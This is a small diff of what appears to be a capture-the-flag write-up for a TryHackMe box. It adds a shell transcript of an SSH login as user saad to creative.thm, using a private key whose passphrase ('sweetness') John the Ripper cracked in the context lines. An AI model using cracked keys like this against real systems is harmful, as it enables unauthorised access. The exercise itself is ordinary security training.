@@ -75,6 +75,11 @@ sweetness        (id_rsa2)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 
+┌──(duke㉿kali)-[~/Documents/THM_Creative]
+└─$ ssh -i rsa_id7 saad@creative.thm 
+Enter passphrase for key 'rsa_id7': 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
+
 
 
 <\code>
